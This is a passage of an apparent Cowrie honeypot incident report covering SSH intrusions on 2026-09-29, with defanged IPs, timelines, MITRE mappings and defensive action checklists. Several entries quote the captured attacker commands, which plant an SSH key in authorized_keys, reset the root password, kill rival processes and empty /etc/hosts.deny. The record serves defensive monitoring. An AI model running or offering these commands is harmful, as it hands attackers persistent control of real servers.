| `2026-09-29 10:31:43` | `cowrie.client.version` |
| `2026-09-29 10:31:43` | `cowrie.client.kex` |
| `2026-09-29 10:31:44` | `cowrie.login.success` |
| `2026-09-29 10:31:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.61.33[.]68` to AbuseIPDB if not already reported
- [ ] Block `182.61.33[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-540a0110e142

| Field | Detail |
|---|---|
| **Source IP** | `181.62.56[.]67` |
| **First Seen** | 2026-09-29 10:33 |
| **Last Seen** | 2026-09-29 10:33 |
| **Session Duration** | 42s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:SRhNXAZdf0ZV"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 10:33:10` | `cowrie.session.connect` |
| `2026-09-29 10:33:10` | `cowrie.client.version` |
| `2026-09-29 10:33:10` | `cowrie.client.kex` |
| `2026-09-29 10:33:11` | `cowrie.login.success` |
| `2026-09-29 10:33:12` | `cowrie.session.params` |
| `2026-09-29 10:33:12` | `cowrie.command.input` |
| `2026-09-29 10:33:12` | `cowrie.command.failed` |
| `2026-09-29 10:33:12` | `cowrie.log.closed` |
| `2026-09-29 10:33:12` | `cowrie.session.params` |
| `2026-09-29 10:33:12` | `cowrie.command.input` |
| `2026-09-29 10:33:13` | `cowrie.session.file_download` |
| `2026-09-29 10:33:13` | `cowrie.log.closed` |
| `2026-09-29 10:33:41` | `cowrie.session.params` |
| `2026-09-29 10:33:41` | `cowrie.command.input` |
| `2026-09-29 10:33:41` | `cowrie.log.closed` |
| `2026-09-29 10:33:42` | `cowrie.session.params` |
| `2026-09-29 10:33:42` | `cowrie.command.input` |
| `2026-09-29 10:33:42` | `cowrie.log.closed` |
| `2026-09-29 10:33:43` | `cowrie.session.params` |
| `2026-09-29 10:33:43` | `cowrie.command.input` |
| `2026-09-29 10:33:43` | `cowrie.session.file_download` |
| `2026-09-29 10:33:43` | `cowrie.log.closed` |
| `2026-09-29 10:33:44` | `cowrie.session.params` |
| `2026-09-29 10:33:44` | `cowrie.command.input` |
| `2026-09-29 10:33:44` | `cowrie.log.closed` |
| `2026-09-29 10:33:44` | `cowrie.session.params` |
| `2026-09-29 10:33:44` | `cowrie.command.input` |
| `2026-09-29 10:33:45` | `cowrie.log.closed` |
| `2026-09-29 10:33:45` | `cowrie.session.params` |
| `2026-09-29 10:33:45` | `cowrie.command.input` |
| `2026-09-29 10:33:45` | `cowrie.command.input` |
| `2026-09-29 10:33:45` | `cowrie.log.closed` |
| `2026-09-29 10:33:46` | `cowrie.session.params` |
| `2026-09-29 10:33:46` | `cowrie.command.input` |
| `2026-09-29 10:33:46` | `cowrie.log.closed` |
| `2026-09-29 10:33:47` | `cowrie.session.params` |
| `2026-09-29 10:33:47` | `cowrie.command.input` |
| `2026-09-29 10:33:47` | `cowrie.log.closed` |
| `2026-09-29 10:33:47` | `cowrie.session.params` |
| `2026-09-29 10:33:47` | `cowrie.command.input` |
| `2026-09-29 10:33:48` | `cowrie.log.closed` |
| `2026-09-29 10:33:48` | `cowrie.session.params` |
| `2026-09-29 10:33:48` | `cowrie.command.input` |
| `2026-09-29 10:33:49` | `cowrie.log.closed` |
| `2026-09-29 10:33:49` | `cowrie.session.params` |
| `2026-09-29 10:33:49` | `cowrie.command.input` |
| `2026-09-29 10:33:49` | `cowrie.log.closed` |
| `2026-09-29 10:33:50` | `cowrie.session.params` |
| `2026-09-29 10:33:50` | `cowrie.command.input` |
| `2026-09-29 10:33:50` | `cowrie.log.closed` |
| `2026-09-29 10:33:51` | `cowrie.session.params` |
| `2026-09-29 10:33:51` | `cowrie.command.input` |
| `2026-09-29 10:33:51` | `cowrie.log.closed` |
| `2026-09-29 10:33:51` | `cowrie.session.params` |
| `2026-09-29 10:33:51` | `cowrie.command.input` |
| `2026-09-29 10:33:52` | `cowrie.log.closed` |
| `2026-09-29 10:33:52` | `cowrie.session.params` |
| `2026-09-29 10:33:52` | `cowrie.command.input` |
| `2026-09-29 10:33:52` | `cowrie.log.closed` |
| `2026-09-29 10:33:53` | `cowrie.session.params` |
| `2026-09-29 10:33:53` | `cowrie.command.input` |
| `2026-09-29 10:33:53` | `cowrie.log.closed` |
| `2026-09-29 10:33:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.62.56[.]67` to AbuseIPDB if not already reported
- [ ] Block `181.62.56[.]67` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d72e7c3169fa

| Field | Detail |
|---|---|
| **Source IP** | `43.133.61[.]254` |
| **First Seen** | 2026-09-29 10:36 |
| **Last Seen** | 2026-09-29 10:36 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 10:36:33` | `cowrie.session.connect` |
| `2026-09-29 10:36:33` | `cowrie.client.version` |
| `2026-09-29 10:36:33` | `cowrie.client.kex` |
| `2026-09-29 10:36:34` | `cowrie.login.success` |
| `2026-09-29 10:36:35` | `cowrie.session.params` |
| `2026-09-29 10:36:35` | `cowrie.command.input` |
| `2026-09-29 10:36:35` | `cowrie.command.failed` |
| `2026-09-29 10:36:35` | `cowrie.log.closed` |
| `2026-09-29 10:36:36` | `cowrie.session.params` |
| `2026-09-29 10:36:36` | `cowrie.command.input` |
| `2026-09-29 10:36:36` | `cowrie.session.file_download` |
| `2026-09-29 10:36:36` | `cowrie.log.closed` |
| `2026-09-29 10:36:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.133.61[.]254` to AbuseIPDB if not already reported
- [ ] Block `43.133.61[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd248d4638ff

| Field | Detail |
|---|---|
| **Source IP** | `43.133.61[.]254` |
| **First Seen** | 2026-09-29 10:36 |
| **Last Seen** | 2026-09-29 10:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 10:36:37` | `cowrie.session.connect` |
| `2026-09-29 10:36:37` | `cowrie.client.version` |
| `2026-09-29 10:36:37` | `cowrie.client.kex` |
| `2026-09-29 10:36:38` | `cowrie.login.success` |
| `2026-09-29 10:36:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.133.61[.]254` to AbuseIPDB if not already reported
- [ ] Block `43.133.61[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45f1a902e8f7

| Field | Detail |
|---|---|
| **Source IP** | `187.141.71[.]166` |
| **First Seen** | 2026-09-29 10:37 |
| **Last Seen** | 2026-09-29 10:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 10:37:02` | `cowrie.session.connect` |
| `2026-09-29 10:37:02` | `cowrie.client.version` |
| `2026-09-29 10:37:02` | `cowrie.client.kex` |
| `2026-09-29 10:37:02` | `cowrie.login.success` |
| `2026-09-29 10:37:03` | `cowrie.session.params` |
| `2026-09-29 10:37:03` | `cowrie.command.input` |
| `2026-09-29 10:37:03` | `cowrie.command.failed` |
| `2026-09-29 10:37:03` | `cowrie.log.closed` |
| `2026-09-29 10:37:04` | `cowrie.session.params` |
| `2026-09-29 10:37:04` | `cowrie.command.input` |
| `2026-09-29 10:37:04` | `cowrie.session.file_download` |
| `2026-09-29 10:37:04` | `cowrie.log.closed` |
| `2026-09-29 10:37:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.141.71[.]166` to AbuseIPDB if not already reported
- [ ] Block `187.141.71[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e721387d016

| Field | Detail |
|---|---|
| **Source IP** | `187.141.71[.]166` |
| **First Seen** | 2026-09-29 10:37 |
| **Last Seen** | 2026-09-29 10:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 10:37:04` | `cowrie.session.connect` |
| `2026-09-29 10:37:04` | `cowrie.client.version` |
| `2026-09-29 10:37:04` | `cowrie.client.kex` |
| `2026-09-29 10:37:05` | `cowrie.login.success` |
| `2026-09-29 10:37:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.141.71[.]166` to AbuseIPDB if not already reported
- [ ] Block `187.141.71[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b7692d35b8f

| Field | Detail |
|---|---|
| **Source IP** | `20.106.202[.]68` |
| **First Seen** | 2026-09-29 10:39 |
| **Last Seen** | 2026-09-29 10:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 10:39:44` | `cowrie.session.connect` |
| `2026-09-29 10:39:44` | `cowrie.client.version` |
| `2026-09-29 10:39:44` | `cowrie.client.kex` |
| `2026-09-29 10:39:44` | `cowrie.login.success` |
| `2026-09-29 10:39:44` | `cowrie.session.params` |
| `2026-09-29 10:39:44` | `cowrie.command.input` |
| `2026-09-29 10:39:44` | `cowrie.command.failed` |
| `2026-09-29 10:39:44` | `cowrie.log.closed` |
| `2026-09-29 10:39:45` | `cowrie.session.params` |
| `2026-09-29 10:39:45` | `cowrie.command.input` |
| `2026-09-29 10:39:45` | `cowrie.session.file_download` |
| `2026-09-29 10:39:45` | `cowrie.log.closed` |
| `2026-09-29 10:39:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.106.202[.]68` to AbuseIPDB if not already reported
- [ ] Block `20.106.202[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48790508bb8e

| Field | Detail |
|---|---|
| **Source IP** | `20.106.202[.]68` |
| **First Seen** | 2026-09-29 10:39 |
| **Last Seen** | 2026-09-29 10:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 10:39:45` | `cowrie.session.connect` |
| `2026-09-29 10:39:45` | `cowrie.client.version` |
| `2026-09-29 10:39:45` | `cowrie.client.kex` |
| `2026-09-29 10:39:45` | `cowrie.login.success` |
| `2026-09-29 10:39:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.106.202[.]68` to AbuseIPDB if not already reported
- [ ] Block `20.106.202[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33e898b988b5

| Field | Detail |
|---|---|
| **Source IP** | `125.88.225[.]11` |
| **First Seen** | 2026-09-29 10:39 |
| **Last Seen** | 2026-09-29 10:40 |
| **Session Duration** | 51s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo -e "cod\njUWK355twEp6\njUWK355twEp6"|passwd|bash, Enter new UNIX password: ` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 10:39:53` | `cowrie.session.connect` |
| `2026-09-29 10:39:53` | `cowrie.client.version` |
| `2026-09-29 10:39:53` | `cowrie.client.kex` |
| `2026-09-29 10:39:54` | `cowrie.login.success` |
| `2026-09-29 10:39:55` | `cowrie.session.params` |
| `2026-09-29 10:39:55` | `cowrie.command.input` |
| `2026-09-29 10:39:55` | `cowrie.command.failed` |
| `2026-09-29 10:39:56` | `cowrie.log.closed` |
| `2026-09-29 10:39:57` | `cowrie.session.params` |
| `2026-09-29 10:39:57` | `cowrie.command.input` |
| `2026-09-29 10:39:57` | `cowrie.session.file_download` |
| `2026-09-29 10:39:57` | `cowrie.log.closed` |
| `2026-09-29 10:40:26` | `cowrie.session.params` |
| `2026-09-29 10:40:26` | `cowrie.command.input` |
| `2026-09-29 10:40:26` | `cowrie.log.closed` |
| `2026-09-29 10:40:27` | `cowrie.session.params` |
| `2026-09-29 10:40:27` | `cowrie.command.input` |
| `2026-09-29 10:40:27` | `cowrie.command.input` |
| `2026-09-29 10:40:27` | `cowrie.command.failed` |
| `2026-09-29 10:40:28` | `cowrie.log.closed` |
| `2026-09-29 10:40:28` | `cowrie.session.params` |
| `2026-09-29 10:40:28` | `cowrie.command.input` |
| `2026-09-29 10:40:29` | `cowrie.log.closed` |
| `2026-09-29 10:40:29` | `cowrie.session.params` |
| `2026-09-29 10:40:29` | `cowrie.command.input` |
| `2026-09-29 10:40:30` | `cowrie.log.closed` |
| `2026-09-29 10:40:31` | `cowrie.session.params` |
| `2026-09-29 10:40:31` | `cowrie.command.input` |
| `2026-09-29 10:40:31` | `cowrie.log.closed` |
| `2026-09-29 10:40:32` | `cowrie.session.params` |
| `2026-09-29 10:40:32` | `cowrie.command.input` |
| `2026-09-29 10:40:32` | `cowrie.command.input` |
| `2026-09-29 10:40:32` | `cowrie.log.closed` |
| `2026-09-29 10:40:33` | `cowrie.session.params` |
| `2026-09-29 10:40:33` | `cowrie.command.input` |
| `2026-09-29 10:40:34` | `cowrie.log.closed` |
| `2026-09-29 10:40:35` | `cowrie.session.params` |
| `2026-09-29 10:40:35` | `cowrie.command.input` |
| `2026-09-29 10:40:35` | `cowrie.log.closed` |
| `2026-09-29 10:40:36` | `cowrie.session.params` |
| `2026-09-29 10:40:36` | `cowrie.command.input` |
| `2026-09-29 10:40:36` | `cowrie.log.closed` |
| `2026-09-29 10:40:37` | `cowrie.session.params` |
| `2026-09-29 10:40:37` | `cowrie.command.input` |
| `2026-09-29 10:40:38` | `cowrie.log.closed` |
| `2026-09-29 10:40:38` | `cowrie.session.params` |
| `2026-09-29 10:40:38` | `cowrie.command.input` |
| `2026-09-29 10:40:39` | `cowrie.log.closed` |
| `2026-09-29 10:40:40` | `cowrie.session.params` |
| `2026-09-29 10:40:40` | `cowrie.command.input` |
| `2026-09-29 10:40:40` | `cowrie.log.closed` |
| `2026-09-29 10:40:41` | `cowrie.session.params` |
| `2026-09-29 10:40:41` | `cowrie.command.input` |
| `2026-09-29 10:40:41` | `cowrie.log.closed` |
| `2026-09-29 10:40:42` | `cowrie.session.params` |
| `2026-09-29 10:40:42` | `cowrie.command.input` |
| `2026-09-29 10:40:42` | `cowrie.log.closed` |
| `2026-09-29 10:40:43` | `cowrie.session.params` |
| `2026-09-29 10:40:43` | `cowrie.command.input` |
| `2026-09-29 10:40:44` | `cowrie.log.closed` |
| `2026-09-29 10:40:45` | `cowrie.session.params` |
| `2026-09-29 10:40:45` | `cowrie.command.input` |
| `2026-09-29 10:40:45` | `cowrie.log.closed` |
| `2026-09-29 10:40:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.88.225[.]11` to AbuseIPDB if not already reported
- [ ] Block `125.88.225[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1ac6f55e960

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-29 10:46 |
| **Last Seen** | 2026-09-29 10:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 10:46:20` | `cowrie.session.connect` |
| `2026-09-29 10:46:20` | `cowrie.client.version` |
| `2026-09-29 10:46:20` | `cowrie.client.kex` |
| `2026-09-29 10:46:20` | `cowrie.login.success` |
| `2026-09-29 10:46:20` | `cowrie.direct-tcpip.request` |
| `2026-09-29 10:46:20` | `cowrie.direct-tcpip.data` |
| `2026-09-29 10:46:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `132.148.30[.]167` | **2** | 2026-09-29 06:56 | 2026-09-29 08:07 | 0m | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | **2** | 2026-09-29 06:55 | 2026-09-29 08:02 | 1m | 0 | `T1592` | 🟢 LOW |
| `58.221.60[.]25` | **2** | 2026-09-29 08:02 | 2026-09-29 10:03 | 4m | 0 | `T1592` | 🟢 LOW |
| `106.12.32[.]235` | 1 | 2026-09-29 10:30 | 2026-09-29 10:32 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.15.236[.]209` | 1 | 2026-09-29 07:55 | 2026-09-29 07:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `109.248.253[.]27` | 1 | 2026-09-29 08:36 | 2026-09-29 08:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `113.31.115[.]157` | 1 | 2026-09-29 08:19 | 2026-09-29 08:21 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.184[.]184` | 1 | 2026-09-29 09:27 | 2026-09-29 09:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.145.114[.]113` | 1 | 2026-09-29 10:36 | 2026-09-29 10:37 | 86s | 0 | `T1592` | 🟢 LOW |
| `121.152.123[.]106` | 1 | 2026-09-29 08:56 | 2026-09-29 08:56 | 27s | 0 | `T1592` | 🟢 LOW |
| `122.114.69[.]235` | 1 | 2026-09-29 10:26 | 2026-09-29 10:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `124.70.97[.]100` | 1 | 2026-09-29 10:27 | 2026-09-29 10:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `125.88.225[.]11` | 1 | 2026-09-29 10:39 | 2026-09-29 10:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-09-29 09:03 | 2026-09-29 09:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | 1 | 2026-09-29 10:08 | 2026-09-29 10:09 | 76s | 0 | `T1592` | 🟢 LOW |
| `14.103.116[.]87` | 1 | 2026-09-29 08:36 | 2026-09-29 08:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `142.93.69[.]27` | 1 | 2026-09-29 08:30 | 2026-09-29 08:31 | 42s | 0 | `T1592` | 🟢 LOW |
| `18.116.101[.]220` | 1 | 2026-09-29 08:09 | 2026-09-29 08:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.223.235[.]56` | 1 | 2026-09-29 09:48 | 2026-09-29 09:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.176.31[.]251` | 1 | 2026-09-29 07:31 | 2026-09-29 07:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]84` | 1 | 2026-09-29 09:26 | 2026-09-29 09:27 | 8s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.96.139[.]27` | 1 | 2026-09-29 09:36 | 2026-09-29 09:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `200.185.202[.]162` | 1 | 2026-09-29 07:50 | 2026-09-29 07:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `209.182.124[.]36` | 1 | 2026-09-29 09:47 | 2026-09-29 09:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `211.43.97[.]233` | 1 | 2026-09-29 10:47 | 2026-09-29 10:48 | 30s | 0 | `T1592` | 🟢 LOW |
| `218.75.165[.]74` | 1 | 2026-09-29 08:43 | 2026-09-29 08:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `219.73.57[.]27` | 1 | 2026-09-29 08:38 | 2026-09-29 08:38 | 19s | 0 | `T1592` | 🟢 LOW |
| `220.134.52[.]133` | 1 | 2026-09-29 10:26 | 2026-09-29 10:26 | 13s | 0 | `T1592` | 🟢 LOW |
| `45.33.14[.]197` | 1 | 2026-09-29 07:36 | 2026-09-29 07:37 | 6s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]111` | 1 | 2026-09-29 08:35 | 2026-09-29 08:35 | 3s | 0 | `T1592` | 🟢 LOW |
| `47.250.221[.]153` | 1 | 2026-09-29 08:48 | 2026-09-29 08:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `5.165.86[.]186` | 1 | 2026-09-29 10:34 | 2026-09-29 10:35 | 30s | 0 | `T1592` | 🟢 LOW |
| `51.158.205[.]203` | 1 | 2026-09-29 09:21 | 2026-09-29 09:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `58.56.200[.]238` | 1 | 2026-09-29 09:23 | 2026-09-29 09:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]242` | 1 | 2026-09-29 07:04 | 2026-09-29 07:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]122` | 1 | 2026-09-29 07:23 | 2026-09-29 07:23 | 2s | 0 | `T1592` | 🟢 LOW |
| `69.5.169[.]222` | 1 | 2026-09-29 09:48 | 2026-09-29 09:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `69.5.169[.]235` | 1 | 2026-09-29 07:31 | 2026-09-29 07:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `71.6.135[.]131` | 1 | 2026-09-29 07:48 | 2026-09-29 07:48 | 10s | 0 | `T1592` | 🟢 LOW |
| `72.14.178[.]148` | 1 | 2026-09-29 08:36 | 2026-09-29 08:36 | 2s | 0 | `T1592` | 🟢 LOW |
| `79.189.129[.]106` | 1 | 2026-09-29 08:20 | 2026-09-29 08:21 | 27s | 0 | `T1592` | 🟢 LOW |
| `86.54.31[.]38` | 1 | 2026-09-29 08:57 | 2026-09-29 08:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.116.119[.]32` | 1 | 2026-09-29 09:29 | 2026-09-29 09:29 | 13s | 0 | `T1592` | 🟢 LOW |
| `93.123.109[.]6` | 1 | 2026-09-29 08:55 | 2026-09-29 08:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]57` | 1 | 2026-09-29 07:42 | 2026-09-29 07:42 | 29s | 0 | `T1592` | 🟢 LOW |
